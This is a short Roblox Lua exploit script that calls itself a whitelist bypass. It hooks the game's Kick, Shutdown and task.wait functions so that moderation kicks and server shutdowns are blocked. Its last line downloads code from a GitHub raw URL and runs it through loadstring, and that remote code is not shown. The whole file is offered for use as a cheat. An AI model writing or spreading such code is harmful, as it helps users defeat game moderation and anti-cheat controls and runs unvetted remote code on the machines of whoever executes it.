-- To who ever is using this, don't share this with ANYONE
-- idc about credits too so im not gonna credit myself for a WhiteList byp script 💀

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local oldKick

oldKick = hookfunction(LocalPlayer.Kick, function(self, reason)
    if self == LocalPlayer then
        warn("Kick blocked, Reason: " .. (reason or "Unknown"))
        return
    end
    return oldKick(self, reason)
end)

local oldShutdown
oldShutdown = hookfunction(game.Shutdown, function(...)
    warn("Shutdown blocked")
    return
end)

local oldLoop
oldLoop = hookfunction(task.wait, function(...)
    if debug.traceback():find("while true do") then
        warn("stopped a loop trying to freeze you 😎 ")
        return
    end
    return oldLoop(...)
end)

warn("Anti kick enabled")

loadstring(game:HttpGet("https://raw.githubusercontent.com/CAXAP26BKyCH/Infinite-jump/refs/heads/main/Gui"))()
